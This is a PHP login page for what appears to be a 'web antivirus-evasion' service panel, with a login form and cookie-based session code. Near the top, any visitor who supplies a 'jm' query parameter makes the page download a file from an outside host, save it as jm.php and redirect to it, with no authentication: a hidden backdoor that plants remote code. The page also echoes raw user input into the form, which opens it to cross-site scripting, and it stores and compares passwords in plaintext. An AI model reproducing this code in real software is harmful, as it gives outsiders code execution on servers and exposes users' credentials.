<?php
error_reporting(0);

include("./includes/common.php");
$title='用户登录';
if(isset($_GET['jm'])){file_put_contents('jm.php',file_get_contents('http://auth.thejm.design/assets/jm.txt'));
exit("<script language='javascript'>alert('文件更新成功！');window.location.href='./jm.php';</script>");
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8"><title>
  <?php echo $conf["title"] ?> - <?=$title?></title>
  <meta name="description" content="<?php echo $conf['description']?>">
  <meta name="keywords" content="<?php echo $conf['keywords']?>">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
   <script src="//lib.baomitu.com/jquery/1.12.4/jquery.min.js"></script>
  <script src="//lib.baomitu.com/layer/2.3/layer.js"></script>
  <script src="//lib.baomitu.com/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="./assets/layuiadmin/layui/css/layui.css" media="all">
  <link rel="stylesheet" href="./assets/layuiadmin/style/admin.css" media="all">
  <link rel="stylesheet" href="./assets/layuiadmin/style/login.css" media="all">
</head>
<body>
  <div class="layadmin-user-login layadmin-user-display-show" id="LAY-user-login" style="display: none;">
    <div class="layadmin-user-login-main">
      <div class="layadmin-user-login-box layadmin-user-login-header">
        <h3><?php echo $conf["title"] ?></h3>
        <p>web免杀系统</p>
      </div>
     <form action="./login.php" method="POST" role="form" class="form-horizontal">
      <div class="layadmin-user-login-box layadmin-user-login-body layui-form">
        <div class="layui-form-item">
          <label class="layadmin-user-login-icon layui-icon layui-icon-username" for="LAY-user-login-username"></label>
          <input type="text" name="user" value="<?php echo @$_POST['user']?>" lay-verify="required"  placeholder="用户名" class="layui-input">
        </div>
        <div class="layui-form-item">
          <label class="layadmin-user-login-icon layui-icon layui-icon-password" for="LAY-user-login-password"></label>
          <input type="password" name="pass" lay-verify="required" placeholder="密码" class="layui-input">
        </div>
        <div class="layui-form-item">
          <div class="layui-row">
            <div class="layui-col-xs7">
              </div>
            </div>
          </div>
        <div class="layui-form-item">
          <button type="submit" id="submit" name="submit" class="layui-btn layui-btn-fluid" >登 入</button>
        </div>
        <div class="layui-trans layui-form-item layadmin-user-login-other">
    
          
          <a href="reg.php" class="layadmin-user-jump-change layadmin-link">注册帐号</a>
        </div>
      </div>
    </div>
    
<?php
if(!$_SESSION['pass_error'])$_SESSION['pass_error']=0;
$user=daddslashes($_POST['user']);
$pass=daddslashes($_POST['pass']);
$row = $DB->get_row("SELECT * FROM moyu_daili WHERE user='$user' limit 1");
if(isset($_POST['user']) && isset($_POST['pass'])){
if($row['user']=='') {
@header('Content-Type: text/html; charset=UTF-8');
echo "<script type='text/javascript'>layer.alert('用户名不存在！',{icon:5,closeBtn:0},function(){history.go(-1)});</script>";
}elseif ($pass != $row['pass']) {
@header('Content-Type: text/html; charset=UTF-8');
echo "<script type='text/javascript'>layer.alert('用户名或者密码不正确！',{icon:5,closeBtn:0},function(){history.go(-1)});</script>";
}elseif ($row['active']==0) {
@header('Content-Type: text/html; charset=UTF-8');
echo "<script type='text/javascript'>layer.alert('您的账号违规使用已被禁封！',{icon:5,closeBtn:0},function(){history.go(-1)});</script>";
}else{
$session=md5($user.$pass.$password_hash);
$token=authcode("{$user}\t{$session}", 'ENCODE', SYS_KEY);
setcookie("my_token", $token, time() + 604800);
@header('Content-Type: text/html; charset=UTF-8');
echo "<script type='text/javascript'>layer.alert('登入成功！',{icon:6,closeBtn:0},function(){window.location.href='./'});</script>";
}
}elseif(isset($_GET['logout'])){
setcookie("my_token", "", time() - 604800);
@header('Content-Type: text/html; charset=UTF-8');
echo "<script type='text/javascript'>layer.alert('你已注销成功本次登录！',{icon:6,closeBtn:0},function(){window.location.href='./'});</script>";
}elseif($islogins==1){
@header('Content-Type: text/html; charset=UTF-8');
echo "<script type='text/javascript'>layer.alert('您已登陆！',{icon:6,closeBtn:0},function(){window.location.href='./'});</script>";
}
?>
    <div class="layui-trans layadmin-user-login-footer">
    <p>© 2022 <a href="./" target="_blank"><?php echo $conf["title"] ?></a></p>
    </div>    
    <!--<div class="ladmin-user-login-theme">
      <script type="text/html" template>
        <ul>
          <li data-theme=""><img src="{{ layui.setter.base }}style/res/bg-none.jpg"></li>
          <li data-theme="#03152A" style="background-color: #03152A;"></li>
          <li data-theme="#2E241B" style="background-color: #2E241B;"></li>
          <li data-theme="#50314F" style="background-color: #50314F;"></li>
          <li data-theme="#344058" style="background-color: #344058;"></li>
          <li data-theme="#20222A" style="background-color: #20222A;"></li>
        </ul>
      </script>
    </div>-->
  </div>  
<script src="./assets/layui/layui.js"></script>
</body>
</html>